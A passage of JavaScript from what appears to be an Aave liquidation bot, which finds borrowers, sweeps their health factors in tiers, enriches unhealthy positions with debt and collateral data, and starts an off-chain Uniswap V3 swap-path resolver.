    return debtPositions[0];
}

async function getDebtPositions(userAddress, provider, chainConfig = {}) {
    if (!chainConfig.protocolDataProvider) {
      const fallbackDebt = await getDebtPosition(
        userAddress,
        provider,
        chainConfig.debtAssetAddress || process.env.DEBT_ASSET_ADDRESS,
        chainConfig
      );
      return fallbackDebt.debtAmount.gt(ethers.constants.Zero) ? [fallbackDebt] : [];
    }

    const reserves = await getReservesListCached(provider, chainConfig);
    const debtPositions = [];

    for (const asset of reserves) {
      try {
        const [reserveData, metadata] = await Promise.all([
          getUserReserveData(asset, userAddress, provider, chainConfig),
          getAssetMetadataCached(asset, provider, chainConfig),
        ]);
        const debtAmount = reserveData.currentStableDebt.add(reserveData.currentVariableDebt);

        if (debtAmount.gt(ethers.constants.Zero)) {
          debtPositions.push({
            debtAsset: asset,
            debtAmount,
            debtSymbol: metadata.symbol,
            debtDecimals: metadata.decimals,
            debtInUnits: Number.parseFloat(ethers.utils.formatUnits(debtAmount, metadata.decimals)),
          });
        }
      } catch (error) {
        console.warn(`⚠️ Failed to fetch debt reserve ${asset} for ${userAddress}: ${error.message}`);
      }
    }

    return debtPositions.sort((left, right) => right.debtInUnits - left.debtInUnits);
}

// Get user's debt amount for the configured debt asset.
async function getDebtAmount(userAddress, provider, debtAssetAddress, chainConfig = {}) {
    const debtPosition = await getDebtPosition(userAddress, provider, debtAssetAddress, chainConfig);
    return debtPosition.debtAmount;
  }

// Fetch users who have borrowed from a specific reserve
async function getReserveUsers(reserveAddress, chainConfig = {}) {
    const query = `
    {
      borrows(where: { reserve: "${reserveAddress.toLowerCase()}" }, first: 1000) {
        user {
          id
        }
      }
    }`;

    try {
        console.log(`🔎 Fetching borrowers for reserve: ${reserveAddress}...`); // 🛠 Debug log

        const response = await fetch(getSubgraphUrl(chainConfig), {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ query }),
        });

        const data = await response.json();
        console.log(`📜 Raw response for ${reserveAddress}:`, JSON.stringify(data, null, 2)); // 🛠 Debug log

        if (!data.data || data.data.borrows.length === 0) {
            console.warn(`⚠️ Warning: No borrowers found for reserve ${reserveAddress}`);
            return [];
        }

        // Extract borrower addresses
        const borrowers = data.data.borrows.map(b => b.user.id);
        console.log(`✅ Found ${borrowers.length} borrowers for ${reserveAddress}`);
        return borrowers;
    } catch (error) {
        console.error(`❌ Failed to fetch borrowers for ${reserveAddress}:`, error.message);
        return [];
    }
}

async function getUnhealthyPositions(provider, chainConfig = {}) {
    console.log(`🔎 Fetching borrowers for ${chainConfig.name || "configured Aave market"}...`);

    const borrowers = await getBorrowers(provider, chainConfig);
    if (borrowers.length === 0) {
      console.warn("⚠️ No borrowers found.");
      return [];
    }

    const threshold = parseFloat(process.env.LIQUIDATION_THRESHOLD || "1.0");
    const watchlistHf = parseFloat(process.env.WATCHLIST_HF || "1.25");
    // NEAR_HF (≥ watchlistHf) defines a wider mid-tier swept EVERY cycle: non-dust
    // wallets in the 1.25–1.5 band that would otherwise only be re-checked on the
    // slow full/warm sweep, and so could cross to liquidation unseen between them.
    // Per-chain overridable (<CHAIN>_NEAR_HF). Set ≤ watchlistHf to disable the tier.
    const nearHf = resolveChainNearHf(chainConfig, watchlistHf);
    const triggerHf = resolveChainTriggerHf(chainConfig, threshold);
    const fullSweepEveryN = parseInt(process.env.FULL_SWEEP_EVERY_N || "8", 10);
    const coldSweepEveryN = parseInt(process.env.COLD_SWEEP_EVERY_N || "4", 10);
    // Time-based COLD floor (minutes). COLD is the ONLY sweep that promotes a
    // newly-borrowing whale (in the known set but no debt at last cold) into the
    // active-debt/warm tier the fast triggers actually watch. Counter-based
    // cadence alone let COLD go ~a full day between runs once warm slicing slowed
    // how fast warmSweepsSinceCold accrues — so freshly-risky whales were never
    // re-checked and we never fired. This guarantees COLD runs at least every
    // COLD_MAX_AGE_MIN regardless of the counters. 0 disables the time floor.
    const coldMaxAgeMin = parseInt(process.env.COLD_MAX_AGE_MIN || "30", 10);
    // WARM_SWEEP_SLICES (per-chain <CHAIN>_WARM_SWEEP_SLICES): split the warm
    // active-debt sweep into this many rotating slices, one slice per warm cycle,
    // so a large index (Base's ~60k) doesn't stall a single cycle for 90s–7min and
    // starve the every-cycle watchlist/near tiers. 1 = legacy single-cycle warm
    // sweep. Each slice still unions its debt-holders into the index (warm never
    // prunes — only COLD does), so N slices cover the whole index across N cycles,
    // equivalent to one big warm sweep, just spread out. The hot watchlist∪near∪new
    // tiers are added to EVERY warm slice, so detection of at-risk wallets is never
    // delayed by slicing.
    const chainEnvKey = (chainConfig.key || "").toUpperCase();
    const warmSweepSlices = Math.max(
      1,
      parseInt(
        (chainEnvKey && process.env[`${chainEnvKey}_WARM_SWEEP_SLICES`]) || process.env.WARM_SWEEP_SLICES || "1",
        10
      ) || 1
    );
    const minDebtUsd = resolveChainMinDebtUsd(chainConfig);
    const chainKey = chainConfig.key || "default";

    // Phase 1: STRATIFIED + BATCHED health-factor sweep, three tiers by cost.
    //
    // Checking every ever-borrowed wallet every cycle does not scale (Base has
    // ~210k ever-borrowed, but only a few thousand carry debt right now). All
    // reads go through Multicall3 and STREAM batch-by-batch (flat heap), so the
    // tiers are about RPC time, not memory:
    //   - WATCHLIST (every cycle): wallets last seen with HF < WATCHLIST_HF and
    //     non-dust debt — tiny, fast; this is where liquidations actually come from.
    //   - WARM / "full" (every FULL_SWEEP_EVERY_N cycles, or watchlist empty):
    //     the active-debt index (wallets observed with totalDebtBase > 0). This
    //     refreshes the watchlist from the only wallets that could ever be
    //     liquidatable, at a fraction of the all-borrower cost.
    //   - COLD (every COLD_SWEEP_EVERY_N warm sweeps, or index empty): the entire
    //     borrower set. The only sweep that pays the full ~210k cost; it rebuilds
    //     the active-debt index to catch wallets that took on debt without a
    //     Borrow event we'd see incrementally.
    const { watch, cyclesSinceFullSweep } = loadWatchlist(chainKey);
    const { near } = loadNear(chainKey);
    const { hot } = loadHot(chainKey);
    const { active, warmSweepsSinceCold, lastColdAt } = loadActiveDebt(chainKey);

    // On a watchlist/warm cycle, also include borrowers discovered THIS cycle by
    // the incremental Borrow scan — a freshly-opened risky position should be
    // health-checked now, not delayed up to FULL_SWEEP_EVERY_N cycles.
    const newThisScan = borrowers.newThisScan instanceof Set ? borrowers.newThisScan : new Set();

    // COLD is also forced when the active-debt index is older than COLD_MAX_AGE_MIN,
    // so a stale index (and the whales that borrowed since) can't linger unseen
    // between counter-driven cold sweeps. A never-run index (lastColdAt null) and a
    // failed timestamp parse both read as stale → due now.
    const coldAgeMs = lastColdAt ? Date.now() - Date.parse(lastColdAt) : Infinity;
    const coldStale = coldMaxAgeMin > 0 && !(coldAgeMs >= 0 && coldAgeMs < coldMaxAgeMin * 60_000);
    const needFullSweep = watch.size === 0 || cyclesSinceFullSweep >= fullSweepEveryN || coldStale;
    const doColdSweep =
      (needFullSweep && (active.size === 0 || warmSweepsSinceCold >= coldSweepEveryN)) ||
      (coldStale && active.size > 0);
    const doWarmSweep = needFullSweep && !doColdSweep;
    const sweepType = doColdSweep ? "COLD" : doWarmSweep ? "WARM" : "watchlist";

    let sweepSet;
    if (doColdSweep) {
      sweepSet = borrowers;
    } else if (doWarmSweep) {
      // WARM = re-scan the active-debt index to catch wallets that crossed toward
      // liquidation since the last full sweep. On a large index (Base ~60k) doing
      // it all in one cycle stalls 90s–7min and starves the every-cycle tiers, so
      // optionally take one rotating slice of the index per warm cycle. Across
      // `warmSweepSlices` warm cycles every wallet is covered; since warm only
      // UNIONS into the index (never prunes — only COLD prunes), a sliced pass is
      // equivalent to one big warm sweep, just spread out.
      let warmSlice = active;
      if (warmSweepSlices > 1 && active.size > 0) {
        // Deterministic, stable rotation: sort the index and walk contiguous slices
        // indexed by warmSweepsSinceCold, so successive warm cycles cover disjoint
        // parts and wrap cleanly. (Sorting ~60k strings is sub-ms vs the RPC sweep.)
        const ordered = Array.from(active).sort();
        const sliceIdx = warmSweepsSinceCold % warmSweepSlices;
        const per = Math.ceil(ordered.length / warmSweepSlices);
        warmSlice = ordered.slice(sliceIdx * per, sliceIdx * per + per);
      }
      // Always union the hot every-cycle tiers (watchlist ∪ near ∪ freshly-
      // discovered) so slicing never delays detection of an at-risk wallet, and so
      // nextWatch/nextNear stay authoritative for the wallets they must own.
      const warmSet = new Set(warmSlice);
      for (const w of watch) warmSet.add(w);
      for (const n of near) warmSet.add(n);
      for (const h of hot) warmSet.add(h);
      for (const b of newThisScan) warmSet.add(b);
      sweepSet = Array.from(warmSet);
    } else {
      // Every-cycle (watchlist) sweep: the hot watchlist UNION the wider non-dust
      // "near" mid-tier UNION freshly-discovered borrowers. Including `near` is the
      // fix for the watchlist-gap: a non-dust wallet in the 1.25–1.5 band is now
      // re-checked every cycle, so if it drops below 1.0 between full sweeps we see
      // it the cycle it crosses instead of waiting up to FULL_SWEEP_EVERY_N cycles.
      sweepSet = borrowers.filter((b) => {
        const key = b.toLowerCase();
        return watch.has(key) || near.has(key) || hot.has(key) || newThisScan.has(key);
      });
    }
    if (!doColdSweep && newThisScan.size > 0) {
      console.log(`   ↳ ${chainConfig.name}: +${newThisScan.size} newly-discovered borrower(s) added to this sweep.`);
    }

    console.log(
      `✅ ${chainConfig.name}: ${sweepType} HF sweep of ${sweepSet.length}` +
        ` (known ${borrowers.length}, active-debt ${active.size}, watch ${watch.size},` +
        ` cyclesSinceFull ${cyclesSinceFullSweep}, warmSinceCold ${warmSweepsSinceCold}).`
    );

    const t0 = Date.now();

    // STREAMING fold: instead of materializing one { user, hf, debt } object per
    // borrower (fatal on Base's ~210k set — three full-size arrays at once blew
    // V8's heap), the sweep hands us one decoded result at a time and we fold it
    // straight into the only things we keep: the next watchlist and the unhealthy
    // candidate list. Both stay tiny (near-threshold-with-debt wallets are a few
    // hundred; HF<1-with-debt candidates are typically single digits), so peak
    // heap is O(batchSize + watchlist + candidates), independent of borrower count.
    //
    //   nextWatch  — wallets still near threshold (HF < WATCHLIST_HF) AND carrying
    //                non-dust debt (>= minDebtUsd). On a full sweep this is the new
    //                truth; on a watchlist-only sweep, recovered wallets drop out
    //                and the next full sweep re-adds new ones. We never re-check a
    //                $5 position every cycle when we'd never liquidate it.
    //   candidates — genuinely-unhealthy (HF < threshold), non-dust positions to
    //                enrich + attempt, sorted lowest-HF-first (most urgent / most
    //                contested) below.
    const nextWatch = new Set();
    const nextNear = new Set(); // wider non-dust mid-tier (HF < nearHf), swept every cycle
    const nextHot = new Set(); // tiny trigger tier (HF < triggerHf), swept every block/price update
    const candidates = [];
    let belowThreshold = 0;
    // Active-debt wallets observed THIS sweep (totalDebtUsd > 0). On a cold sweep
    // this becomes the new active-debt index (the truth for "who has debt"); on a
    // warm sweep it's used to prune wallets that fully repaid.
    const nextActive = new Set();

    // On a long full sweep (Base ~210k cold), persist the partial watchlist every
    // N batches so a crash/restart mid-sweep keeps the near-threshold wallets
    // found so far instead of leaving an empty file — which is exactly what
    // trapped Base in a restart loop (watchlist-base.json never existed). We
    // checkpoint with cyclesSinceFullSweep = fullSweepEveryN so a partial sweep is
    // treated as INCOMPLETE and redone next start; only the clean post-sweep save
    // resets to 0. Watchlist cycles are tiny and skip checkpointing. Progress logs
    // gated by VERBOSE_HEALTH_LOGS.
    const checkpointEveryBatches = parseInt(process.env.SWEEP_CHECKPOINT_BATCHES || "50", 10);
    const batchSize = parseInt(process.env.MULTICALL_BATCH_SIZE || "300", 10);
    let lastCheckpointBatch = 0;

    await sweepHealthFactorsStreaming(
      sweepSet,
      provider,
      chainConfig,
      ({ user, healthFactor, totalDebtUsd }) => {
        if (!Number.isFinite(healthFactor)) return;
        if (totalDebtUsd > 0) {
          nextActive.add(user.toLowerCase());
        }
        if (totalDebtUsd >= minDebtUsd) {
          const key = user.toLowerCase();
          if (healthFactor < watchlistHf) nextWatch.add(key);
          // The near tier is the wider band (watchlistHf ≤ HF < nearHf, plus it
          // also includes everything in the watchlist band). Anything non-dust
          // under nearHf is worth re-checking every cycle.
          if (healthFactor < nearHf) nextNear.add(key);
          if (healthFactor < triggerHf) nextHot.add(key);
          // Fix 2: a freshly-discovered borrower with real debt enters the
          // every-cycle near tier regardless of HF, so a wallet that opens
          // healthy (e.g. HF 1.4) is still re-checked every cycle for its first
          // window instead of dropping to COLD-only and going unseen when a price
          // move pushes it under 1.0. It ages out of `near` naturally once it
          // recovers above nearHf on a later sweep (nextNear is authoritative).
          if (newThisScan.has(key)) nextNear.add(key);
        }
        if (healthFactor < threshold) {
          belowThreshold++;
          if (totalDebtUsd >= minDebtUsd) {
            candidates.push({ user, healthFactor, totalDebtUsd });
          }
        }
      },
      {
        onBatchDone: needFullSweep
          ? (sweptSoFar) => {
              const batchNum = Math.ceil(sweptSoFar / batchSize);
              if (sweptSoFar < sweepSet.length && batchNum - lastCheckpointBatch >= checkpointEveryBatches) {
                lastCheckpointBatch = batchNum;
                saveWatchlist(chainKey, nextWatch, fullSweepEveryN);
                saveNear(chainKey, nextNear);
                saveHot(chainKey, nextHot);
                logVerbose(`   …${chainConfig.name}: ${sweepType} checkpoint ${sweptSoFar}/${sweepSet.length} (watch ${nextWatch.size}, near ${nextNear.size}, hot ${nextHot.size}, active ${nextActive.size}).`);
              }
            }
          : undefined,
      }
    );

    if (!needFullSweep) {
      // Watchlist cycle: preserve watchlist members we didn't just re-check
      // (shouldn't happen — sweepSet ⊇ watch here — but be safe).
      for (const w of watch) {
        if (!nextWatch.has(w)) nextWatch.add(w);
      }
    }
    saveWatchlist(chainKey, nextWatch, needFullSweep ? 0 : cyclesSinceFullSweep + 1);

    // Persist the near mid-tier. On every cycle type, `near` members are part of
    // sweepSet (watchlist cycle) or a superset (warm/cold), so nextNear is
    // authoritative — recovered wallets correctly drop out, still-near ones stay.
    // Only write when it changed, to avoid rewriting a multi-thousand-entry file
    // every 15s when nothing moved.
    if (!setsEqual(nextNear, near)) {
      saveNear(chainKey, nextNear);
    }
    saveHot(chainKey, nextHot);

    // Maintain the active-debt index. Only the COLD sweep — which reads every
    // borrower — can authoritatively DROP a wallet (it's the only sweep that can
    // distinguish "repaid" from "not in this sweep set"). Warm/watchlist sweeps
    // only UNION newly-seen-with-debt wallets in; they never prune, because a
    // wallet absent from nextActive on those sweeps just wasn't swept (or had a
    // transient failed read), not necessarily debt-free. This keeps the index
    // from eroding to the hot subset between cold sweeps.
    //   COLD: replace with the complete truth; reset the cold-sweep counter.
    //   WARM: union in new debt holders; bump warmSweepsSinceCold toward the next
    //         cold sweep that will prune.
    //   WATCHLIST: union in new debt holders (e.g. a new borrower); counter unchanged.
    if (doColdSweep) {
      // COLD is the authoritative rebuild — stamp it so the time-based floor
      // measures freshness from this moment.
      saveActiveDebt(chainKey, nextActive, 0, new Date().toISOString());
    } else {
      // Union new debt holders into the index. Warm sweeps always persist (the
      // counter advances); watchlist cycles persist only when they actually add
      // a wallet, so we don't rewrite Base's multi-thousand-entry index every
      // cycle for no change. Carry lastColdAt forward unchanged — only COLD
      // refreshes it.
      const merged = new Set(active);
      let added = 0;
      for (const a of nextActive) { if (!merged.has(a)) { merged.add(a); added++; } }
      if (doWarmSweep) {
        saveActiveDebt(chainKey, merged, warmSweepsSinceCold + 1, lastColdAt);
      } else if (added > 0) {
        saveActiveDebt(chainKey, merged, warmSweepsSinceCold, lastColdAt);
      }
    }

    // Ring-buffer of tier membership for the live-catch detection verdict.
    // (TIER_SNAPSHOT=false to disable.) See scripts/liveCatchDetection.js.
    recordTierSnapshot(chainKey, {
      hot: nextHot,
      near: nextNear,
      watch: nextWatch,
      sweepType,
    });

    // Attempt the most urgent (lowest HF) first — those are the ones a competing
    // bot is also racing for.
    candidates.sort((a, b) => a.healthFactor - b.healthFactor);

    console.log(`✅ ${chainConfig.name}: swept ${sweepSet.length} HFs in ${Date.now() - t0}ms; ${belowThreshold} below ${threshold}, ${candidates.length} above $${minDebtUsd} debt; watchlist now ${nextWatch.size}, near ${nextNear.size}, hot ${nextHot.size}.`);
    metrics.emit("sweep", {
      chain: chainConfig.key, type: sweepType, swept: sweepSet.length,
      sweepMs: Date.now() - t0, below: belowThreshold, candidates: candidates.length,
      watch: nextWatch.size, near: nextNear.size, hot: nextHot.size,
    });

    // Phase 2: enrich only the unhealthy, non-dust candidates (debt + collateral
    // lookups are heavier, so we do them on the short list, in priority order).
    //
    // Each candidate's per-reserve debt/collateral reads are collapsed into ONE
    // Multicall3 batch (enrichCandidateBatched), and candidates are enriched
    // CONCURRENTLY (mapWithConcurrency) instead of one-at-a-time. When several
    // positions go liquidatable in the same block, "found N → ready on all N" is
    // near-instant rather than N serial chains of RPC calls — the lowest-HF
    // target (the one every bot is racing for) is no longer stuck behind the
    // enrichment of the ones below it. Results are reassembled in the original
    // lowest-HF-first priority order.
    const minDebtToCover = parseFloat(process.env.MIN_DEBT_TO_COVER || "0.099");
    const enrichConcurrency = parseInt(process.env.ENRICH_CONCURRENCY || "10", 10);
    const reserves = chainConfig.protocolDataProvider
      ? await getReservesListCached(provider, chainConfig)
      : [];

    const enriched = await mapWithConcurrency(candidates, enrichConcurrency, async ({ user, healthFactor, totalDebtUsd }) => {
      let position;
      try {
        position = await enrichCandidateBatched(user, provider, chainConfig, reserves);
      } catch (error) {
        console.warn(`⚠️ Enrichment failed for ${user}: ${error.message}`);
        return null;
      }
      if (!position) {
        // No remaining debt or no valid collateral — mirrors the prior skips.
        console.log(`⚠️ Skipping ${user}: no remaining debt or no valid collateral.`);
        return null;
      }

      const { debtAsset, debtAmount, debtDecimals, debtSymbol, collateralAsset } = position;
      console.log(`👀 ${user}: HF ${healthFactor.toFixed(4)}, ~$${totalDebtUsd.toFixed(0)} total debt; primary ${ethers.utils.formatUnits(debtAmount, debtDecimals)} ${debtSymbol}`);

      // Secondary per-asset floor (token units) as a backstop.
      const debtInUnits = parseFloat(ethers.utils.formatUnits(debtAmount, debtDecimals));
      if (debtInUnits < minDebtToCover) {
        console.log(`⚠️ Skipping ${user}: Debt too small (${debtInUnits} ${debtSymbol} < ${minDebtToCover}).`);
        return null;
      }

      console.log(`🔥 Found liquidatable position: ${user} | HF: ${healthFactor} | Debt: ${ethers.utils.formatUnits(debtAmount, debtDecimals)} ${debtSymbol}`);
      return {
        user,
        debtAsset,
        debtAmount,
        debtDecimals,
        debtSymbol,
        collateralAsset,
        liquidationBaskets: position.liquidationBaskets,
        healthFactor,
        totalDebtUsd,
      };
    });

    // candidates was already sorted lowest-HF-first; mapWithConcurrency preserves
    // input order, so filtering nulls keeps that priority ordering.
    const unhealthyPositions = enriched.filter(Boolean);

    console.log(`📌 Found ${unhealthyPositions.length} liquidatable positions.`);
    return unhealthyPositions;
  }

async function getReservesList(provider, chainConfig = {}) {
    const pool = new ethers.Contract(getPoolAddress(chainConfig), POOL_ABI, provider);
    return pool.getReservesList();
}

// Cached reserves list. The set of reserves changes only when Aave governance
// lists/drops one, so re-fetching it for every candidate during a liquidation
// race is wasted round-trips. Cached per chain with a long TTL; refreshes lazily.
async function getReservesListCached(provider, chainConfig = {}) {
    const chainKey = chainConfig.key || "default";
    const cached = reservesListCache.get(chainKey);
    if (cached && Date.now() - cached.fetchedAt < RESERVES_CACHE_TTL_MS) {
      return cached.reserves;
    }
    const reserves = await getReservesList(provider, chainConfig);
    reservesListCache.set(chainKey, { reserves, fetchedAt: Date.now() });
    return reserves;
}

// Cached ERC-20 metadata (symbol/decimals are immutable). The configured debt
// asset short-circuits without an RPC call (matches getAssetMetadata's behavior).
async function getAssetMetadataCached(asset, provider, chainConfig = {}) {
    const chainKey = chainConfig.key || "default";
    const cacheKey = `${chainKey}:${asset.toLowerCase()}`;
    const cached = assetMetaCache.get(cacheKey);
    if (cached) return cached;
    const meta = await getAssetMetadata(asset, provider, chainConfig);
    assetMetaCache.set(cacheKey, meta);
    return meta;
}

// Enriches ONE candidate (debt + collateral) using a single Multicall3 batch of
// getUserReserveData across all reserves, instead of one serial RPC per reserve.
// Returns { debtAsset, debtAmount, debtDecimals, debtSymbol, collateralAsset } or
// null if the user has no positive debt or no valid collateral. `reserves` is the
// (cached) reserves list, passed in so a batch of candidates shares one fetch.
//
// Debt selection mirrors getPrimaryDebtPosition: prefer the chain's configured
// debt asset if the user owes it, else the largest debt position. Collateral
// selection mirrors getPrimaryCollateral: the largest aToken balance with
// usageAsCollateralEnabled. Both are derived from the SAME batched read.
async function enrichCandidateBatched(user, provider, chainConfig, reserves) {
    if (!chainConfig.protocolDataProvider || !Array.isArray(reserves) || reserves.length === 0) {
      // No data provider (subgraph-only chain) or no reserves — fall back to the
      // original serial path so behavior is preserved on those configs.
      const debtPosition = await getPrimaryDebtPosition(user, provider, chainConfig);
      if (debtPosition.debtAmount.lte(ethers.constants.Zero)) return null;
      const collateralAsset = await getPrimaryCollateral(user, provider, chainConfig);
      if (!collateralAsset) return null;
      const primary = {
        debtAsset: debtPosition.debtAsset,
        debtAmount: debtPosition.debtAmount,
        debtDecimals: debtPosition.debtDecimals,
        debtSymbol: debtPosition.debtSymbol,
        collateralAsset,
        basketLabel: `${debtPosition.debtSymbol}->collateral`,
      };
      return {
        ...primary,
        liquidationBaskets: [primary],
      };
    }

    const dpAddress = chainConfig.protocolDataProvider;
    const calls = reserves.map((asset) => ({
      target: dpAddress,
      allowFailure: true,
      callData: DATA_PROVIDER_IFACE.encodeFunctionData("getUserReserveData", [asset, user]),
    }));

    const batchSize = parseInt(process.env.MULTICALL_BATCH_SIZE || "300", 10);
    const raw = await aggregate3InBatches(provider, calls, batchSize);

    const preferredDebt = (chainConfig.debtAssetAddress || process.env.DEBT_ASSET_ADDRESS || "").toLowerCase();
    const debtEntries = [];
    const collateralEntries = [];

    for (let i = 0; i < reserves.length; i++) {
      const asset = reserves[i];
      const entry = raw[i];
      if (!entry || !entry.success || !entry.returnData || entry.returnData === "0x") continue;
      let decoded;
      try {
        decoded = DATA_PROVIDER_IFACE.decodeFunctionResult("getUserReserveData", entry.returnData);
      } catch (_) {
        continue;
      }

      const debtAmount = decoded.currentStableDebt.add(decoded.currentVariableDebt);
      if (debtAmount.gt(ethers.constants.Zero)) {
        debtEntries.push({
          asset,
          debtAmount,
          preferred: preferredDebt && asset.toLowerCase() === preferredDebt,
        });
      }

      if (
        decoded.currentATokenBalance.gt(ethers.constants.Zero) &&
        decoded.usageAsCollateralEnabled
      ) {
        collateralEntries.push({ asset, balance: decoded.currentATokenBalance });
      }
    }

    if (debtEntries.length === 0) return null; // no positive debt
    if (collateralEntries.length === 0) return null; // no valid collateral

    const debtsWithMeta = await Promise.all(debtEntries.map(async (entry) => {
      const meta = await getAssetMetadataCached(entry.asset, provider, chainConfig);
      const debtInUnits = Number.parseFloat(ethers.utils.formatUnits(entry.debtAmount, meta.decimals));
      return {
        ...entry,
        debtDecimals: meta.decimals,
        debtSymbol: meta.symbol,
        debtInUnits: Number.isFinite(debtInUnits) ? debtInUnits : 0,
      };
    }));

    debtsWithMeta.sort((left, right) => {
      if (left.preferred !== right.preferred) return left.preferred ? -1 : 1;
      return right.debtInUnits - left.debtInUnits;
    });
    collateralEntries.sort((left, right) => {
      if (left.balance.eq(right.balance)) return 0;
      return left.balance.gt(right.balance) ? -1 : 1;
    });

    const maxBaskets = Math.max(1, parseInt(process.env.MAX_LIQUIDATION_BASKETS || "8", 10) || 8);
    const baskets = [];
    for (const debt of debtsWithMeta) {
      for (const collateral of collateralEntries) {
        baskets.push({
          debtAsset: debt.asset,
          debtAmount: debt.debtAmount,
          debtDecimals: debt.debtDecimals,
          debtSymbol: debt.debtSymbol,
          collateralAsset: collateral.asset,
          basketLabel: `${debt.debtSymbol}->${collateral.asset.slice(0, 8)}`,
        });
        if (baskets.length >= maxBaskets) break;
      }
      if (baskets.length >= maxBaskets) break;
    }

    const primary = baskets[0];
    return {
      ...primary,
      liquidationBaskets: baskets,
    };
}

async function getUserReservePositions(userAddress, provider, chainConfig = {}) {
    const reserves = await getReservesListCached(provider, chainConfig);
    const positions = [];

    for (const asset of reserves) {
      try {
        const reserveData = await getUserReserveData(asset, userAddress, provider, chainConfig);
        positions.push({
          asset,
          ...reserveData,
        });
      } catch (error) {
        console.warn(`⚠️ Failed to fetch reserve data for ${userAddress} on ${asset}: ${error.message}`);
      }
    }

    return positions;
}

async function getUserReserveData(asset, userAddress, provider, chainConfig = {}) {
    const dataProvider = new ethers.Contract(
      chainConfig.protocolDataProvider,
      PROTOCOL_DATA_PROVIDER_ABI,
      provider
    );
    const data = await dataProvider.getUserReserveData(asset, userAddress);

    return {
      currentATokenBalance: data.currentATokenBalance,
      currentStableDebt: data.currentStableDebt,
      currentVariableDebt: data.currentVariableDebt,
      principalStableDebt: data.principalStableDebt,
      scaledVariableDebt: data.scaledVariableDebt,
      stableBorrowRate: data.stableBorrowRate,
      liquidityRate: data.liquidityRate,
      stableRateLastUpdated: data.stableRateLastUpdated,
      usageAsCollateralEnabled: data.usageAsCollateralEnabled,
    };
}

async function getAssetMetadata(asset, provider, chainConfig = {}) {
    if (asset.toLowerCase() === (chainConfig.debtAssetAddress || "").toLowerCase()) {
      return {
        symbol: chainConfig.debtSymbol || "debt asset",
        decimals: 6,
      };
    }

    const token = new ethers.Contract(asset, ERC20_METADATA_ABI, provider);
    const [symbol, decimals] = await Promise.all([
      token.symbol().catch(() => "asset"),
      token.decimals().catch(() => 18),
    ]);

    return {
      symbol,
      decimals: Number(decimals),
    };
}

function getPoolAddress(chainConfig = {}) {
    return chainConfig.pool || process.env.POOL_ADDRESS;
}

function getSubgraphUrl(chainConfig = {}) {
    return chainConfig.subgraphUrl || process.env.SUBGRAPH_URL || DEFAULT_SUBGRAPH_URL;
}

// Per-chain USD debt floor for what's worth liquidating, used both as the
// watchlist/candidate dust filter and (via the bot) the practice-mode gate.
// Resolution: <CHAIN>_MIN_DEBT_USD env override → global MIN_DEBT_USD → $100.
// Lets cheap chains (Avalanche/Optimism) work smaller positions without lowering
// the floor on Base/Arbitrum, where gas makes small liquidations unprofitable.
function resolveChainMinDebtUsd(chainConfig = {}) {
    const key = (chainConfig.key || "").toUpperCase();
    // Try per-chain, then global, then default — each only if it parses to a
    // valid non-negative number, so a malformed per-chain override falls through
    // to the global rather than silently snapping to the hardcoded default.
    const candidates = [key ? process.env[`${key}_MIN_DEBT_USD`] : undefined, process.env.MIN_DEBT_USD, "100"];
    for (const raw of candidates) {
      if (raw === undefined || raw === null || raw === "") continue;
      const v = parseFloat(raw);
      if (Number.isFinite(v) && v >= 0) return v;
    }
    return 100;
}

// Per-chain near-tier HF ceiling: <CHAIN>_NEAR_HF → NEAR_HF → default 1.8.
// Floored at `watchlistHf` so the near tier is never narrower than the watchlist
// (≤ watchlistHf effectively disables the extra mid-tier — watch already covers it).
// Default widened 1.5 → 1.8 (Fix 3): wallets in the 1.5–1.8 band can cross to
// liquidation in a single volatile move, so re-checking them every cycle (instead
// of only on the slow warm/cold sweep) closes the window where a healthy-ish whale
// drops under 1.0 unseen. The near tier is still debt-floored, so this only widens
// the set of *non-dust* wallets watched — cost scales with real positions, not the
// 210k borrower set.
function resolveChainNearHf(chainConfig = {}, watchlistHf = 1.25) {
    const key = (chainConfig.key || "").toUpperCase();
    const candidates = [key ? process.env[`${key}_NEAR_HF`] : undefined, process.env.NEAR_HF, "1.8"];
    for (const raw of candidates) {
      if (raw === undefined || raw === null || raw === "") continue;
      const v = parseFloat(raw);
      if (Number.isFinite(v) && v > 0) return Math.max(v, watchlistHf);
    }
    return Math.max(1.8, watchlistHf);
}

// Per-chain hot trigger ceiling: <CHAIN>_TRIGGER_HF → TRIGGER_HF → default 1.05.
// Block/price triggers scan ONLY this tiny tier, so it should remain close to 1.
function resolveChainTriggerHf(chainConfig = {}, threshold = 1.0) {
    const key = (chainConfig.key || "").toUpperCase();
    const candidates = [key ? process.env[`${key}_TRIGGER_HF`] : undefined, process.env.TRIGGER_HF, "1.05"];
    for (const raw of candidates) {
      if (raw === undefined || raw === null || raw === "") continue;
      const v = parseFloat(raw);
      if (Number.isFinite(v) && v > 0) return Math.max(v, threshold);
    }
    return Math.max(1.05, threshold);
}

// Cheap Set equality (used to skip rewriting the near file when unchanged).
function setsEqual(a, b) {
    if (a.size !== b.size) return false;
    for (const x of a) if (!b.has(x)) return false;
    return true;
}

// ---------------------------------------------------------------------------
// Off-chain V3 swap-path resolver (task 3.3)
//
// Builds the standard packed V3 path the contract's exactInput consumes: a DIRECT
// pool across the common fee tiers [100,500,3000,10000], else a 2-HOP via each
// intermediate (the contract seeds wrappedNative; the deploy script adds
// chainConfig.swapIntermediates). Returns packed bytes
// (tokenIn|fee|tokenOut or tokenIn|fee1|mid|fee2|tokenOut), or "0x" if no path is
// found (caller then lets the contract self-resolve / skips).
//
// IMPORTANT: this is STRICTLY BETTER than the contract's on-chain _findFeeTier,
// which returns the FIRST tier where getPool != 0 — even if that pool has ZERO
// liquidity (verified on Base: e.g. cbETH/USDC, weETH/USDC, WETH/GHO all have an
// empty 100bps pool, so the on-chain path would route through a dead pool and
// revert). Off-chain we additionally read pool.liquidity() and pick the tier with
// the MOST current-tick liquidity, skipping empty pools. Passing this path in
// calldata is what makes those liquidations executable at all. The contract still
// enforces the profit floor at amountOutMinimum, so a path that can't fill the
// size reverts cheaply.
//
// Read-only; results cached per (chain, tokenIn, tokenOut). The factory is read
// once per chain from the configured swapRouter.
// ---------------------------------------------------------------------------
const V3_FACTORY_IFACE = new ethers.utils.Interface([
  "function getPool(address tokenA, address tokenB, uint24 fee) view returns (address)",
]);
const V3_POOL_LIQ_IFACE = new ethers.utils.Interface([
  "function liquidity() view returns (uint128)",
]);
const ROUTER_FACTORY_IFACE = new ethers.utils.Interface([
  "function factory() view returns (address)",
]);
const COMMON_FEE_TIERS = [100, 500, 3000, 10000]; // matches contract constructor
